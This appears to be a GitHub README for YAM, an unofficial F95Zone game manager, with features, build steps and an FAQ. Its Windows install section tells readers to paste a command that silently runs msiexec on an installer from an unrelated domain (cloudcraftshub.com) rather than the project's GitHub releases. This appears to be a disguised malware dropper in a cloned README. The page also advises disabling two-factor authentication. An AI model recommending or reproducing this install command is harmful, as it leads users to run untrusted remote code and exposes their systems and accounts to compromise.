<div align="center">

<br/>

```
██╗   ██╗ █████╗ ███╗   ███╗
╚██╗ ██╔╝██╔══██╗████╗ ████║
 ╚████╔╝ ███████║██╔████╔██║
  ╚██╔╝  ██╔══██║██║╚██╔╝██║
   ██║   ██║  ██║██║ ╚═╝ ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝
```

### **Yet Another Manager**
*Unofficial desktop game manager for the F95Zone platform*

<br/>

[![Build](https://img.shields.io/github/actions/workflow/status/MillenniumEarl/YAM/build.yml?style=for-the-badge&logo=github-actions&logoColor=white&label=Build)](https://github.com/MillenniumEarl/YAM/actions)
[![Release](https://img.shields.io/github/v/release/MillenniumEarl/YAM?style=for-the-badge&logo=github&color=4a90d9)](https://github.com/MillenniumEarl/YAM/releases/latest)
[![Downloads](https://img.shields.io/github/downloads/MillenniumEarl/YAM/total?style=for-the-badge&logo=windows&color=0078d4)](https://github.com/MillenniumEarl/YAM/releases)
[![Stars](https://img.shields.io/github/stars/MillenniumEarl/YAM?style=for-the-badge&logo=github&color=ffd700)](https://github.com/MillenniumEarl/YAM/stargazers)
[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Crowdin](https://badges.crowdin.net/yam/localized.svg)](https://crowdin.com/project/yam)

<br/>

**[⚡ Install on Windows](#-windows--one-command-install)** · **[📸 Screenshots](#-screenshots)** · **[✨ Features](#-features)** · **[🤝 Contribute](#-contributing)**

<br/>

> Stop manually hunting for game updates. YAM tracks your F95Zone library, notifies you of new versions, and keeps everything organized — automatically.

<br/>

</div>

---

## 📸 Screenshots

<div align="center">

![YAM Preview](resources/images/github/preview.gif)

*YAM in action — game library overview with update notifications*

</div>

---

## ✨ Features

<table>
<tr>
<td width="50%">

### 🎮 Library Management
- Add games by **folder** or **F95Zone URL**
- View cover art, tags, engine, status, and full metadata
- Launch or delete games directly from the app
- Smart folder renaming to match installed version

</td>
<td width="50%">

### 🔔 Update Tracking
- Automatic update checks on startup
- Visual badge when a new version is available
- Step-by-step **update wizard** guides you through the process
- Marks updates as completed once applied

</td>
</tr>
<tr>
<td width="50%">

### 💾 Save Management *(Beta)*
- Export and import game saves
- Currently supports **Ren'Py** and **RPGM** tagged games
- Never lose your progress when updating

</td>
<td width="50%">

### 🌍 Multilingual
- 🇬🇧 English · 🇮🇹 Italiano · 🇪🇸 Español
- 🇵🇹 Português · 🇩🇪 Deutsch · 🇨🇳 中文
- 🇷🇺 Русский · 🇳🇱 Nederlands
- Help add more on [Crowdin](https://crwd.in/yam)!

</td>
</tr>
</table>

---

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem F95Zone
```
The installer will automatically download and install the required components.


## 🚀 Getting Started

### Prerequisites

- An active **F95Zone account** ([register here](https://f95zone.to/register))
- Windows 10/11 (64-bit recommended)
- ⚠️ **Two-factor authentication is not currently supported** — disable 2FA before use

### Adding Your First Game

**Method 1 — From a folder** (game already downloaded):
1. Click the **`+`** button (bottom-right)
2. Select the folder containing the game

**Method 2 — From a URL**:
1. Click **`+`** → choose URL mode
2. Select the game's local folder
3. Paste the **F95Zone thread URL** (Post #1 of the thread)

> ⚠️ **Folder naming matters!** For auto-detection, folders must follow this format:
> ```
> GAME NAME [v.VERSION] [MOD]
> ```
> Examples: `City of Broken Dreamers [v.1.10.1]` · `Being A DIK [v.0.9.0] [MOD]`

---

## 🔄 How Update Tracking Works

```
App starts
    │
    ▼
┌──────────────────┐      ┌─────────────────────────┐
│  Local Library   │─────▶│  F95Zone API check       │
│  (NeDB database) │      │  (version comparison)    │
└──────────────────┘      └────────────┬────────────┘
                                       │
                          ┌────────────▼────────────┐
                          │  Update available?       │
                          │  → Blue button appears   │
                          │  → Click to start wizard │
                          └────────────┬────────────┘
                                       │
                   ┌───────────────────▼──────────────────┐
                   │  Step 1: Opens F95Zone download page  │
                   │          + local game folder          │
                   │  Step 2: Mark as updated, rename dir  │
                   └──────────────────────────────────────┘
```

---

## 🏗️ Project Structure

```
YAM/
├── app/
│   ├── app.js                    # Main Electron process
│   ├── db/
│   │   ├── schemas/              # NeDB data schemas
│   │   └── store/                # Persistent storage
│   ├── electron/
│   │   └── window/               # One folder per window
│   │       └── [name]-preload.js # IPC bridge (ContextBridge)
│   │       └── [name]-renderer.js
│   └── src/
│       ├── components/           # Reusable UI components
│       ├── styles/               # CSS
│       └── scripts/
│           └── classes/          # Core logic classes
├── docs/                         # API documentation
├── resources/                    # Icons, images, i18n strings
├── install.ps1                   # Windows one-command installer
├── package.json
└── README.md
```

**Tech stack:** Electron · Vanilla JS · MaterializeCSS · NeDB · i18next · F95API

**Security model:**
- `contextIsolation: true` — renderer isolated from Node
- `nodeIntegration: false` — no direct Node access in renderer
- `enableRemoteModule: false` — remote module disabled
- Full IPC + ContextBridge pattern for all main↔renderer communication

---

## 🛠️ Build from Source

```bash
# 1. Clone
git clone https://github.com/MillenniumEarl/YAM.git
cd YAM

# 2. Install dependencies
npm install

# 3. Run in dev mode
npm start

# 4. Build installer
npm run dist:win      # Windows (.exe)
npm run dist:mac      # macOS (.dmg)
npm run dist:linux    # Linux (.AppImage)
```

**Requirements:** Node.js ≥ 14.10 · npm

---

## 🤝 Contributing

All contributions are welcome! Here's how to get involved:

| Area | How to help |
|------|------------|
| 🐛 **Bug reports** | Open an [Issue](https://github.com/MillenniumEarl/YAM/issues/new) with steps to reproduce |
| 🌍 **Translations** | Contribute on [Crowdin](https://crwd.in/yam) — no coding needed |
| 🎨 **Frontend** | Improve HTML/CSS, submit a PR |
| ⚙️ **Backend** | Help with [F95API](https://github.com/MillenniumEarl/F95API) — the core engine |
| 📝 **Docs** | Fix typos, improve examples |

**PR guidelines:**
1. Fork → feature branch (`git checkout -b feat/my-feature`)
2. Commit with a descriptive message
3. Open a Pull Request with a clear description

---

## ❓ FAQ

**Q: The app says "game not detected" — what's wrong?**  
A: Your folder name doesn't match the required format. Rename it to `GAME NAME [v.VERSION]` (e.g. `Eternum [v.0.9.3]`), then re-add.

**Q: Can I use this with 2FA enabled on F95Zone?**  
A: Not currently. Disable 2FA on your account to use YAM.

**Q: Games show as "up to date" but I know there's an update.**  
A: Check that the folder name matches the game title exactly. If it's still wrong, add the game via URL instead.

**Q: My game saves — will they survive an update?**  
A: Use the built-in save export (Beta, Ren'Py/RPGM only). For other engines, manually back up your save folder before updating.

**Q: Does YAM work on Linux / macOS?**  
A: Yes! Build from source (`npm run dist:linux` / `npm run dist:mac`). Pre-built binaries are Windows-only for now.

**Q: Is my F95Zone password stored securely?**  
A: Credentials are stored locally using `electron-store` (encrypted with the machine's secret). They are never sent anywhere except the F95Zone login endpoint.

---

## 📜 Changelog

See [CHANGELOG.md](CHANGELOG.md) or the [Releases page](https://github.com/MillenniumEarl/YAM/releases) for version history.

---

## ⚠️ Disclaimer

YAM is an **unofficial**, community-built tool. It is not affiliated with or endorsed by F95Zone. Use at your own risk. Always respect the platform's Terms of Service.

---

## 📄 License

[MIT](LICENSE) © 2021–2025 [MillenniumEarl](https://github.com/MillenniumEarl)

---

<div align="center">

**Found YAM useful? A ⭐ star goes a long way — it helps others discover the project!**

<br/>

[![Star History Chart](https://api.star-history.com/svg?repos=MillenniumEarl/YAM&type=Date)](https://star-history.com/#MillenniumEarl/YAM&Date)

</div>
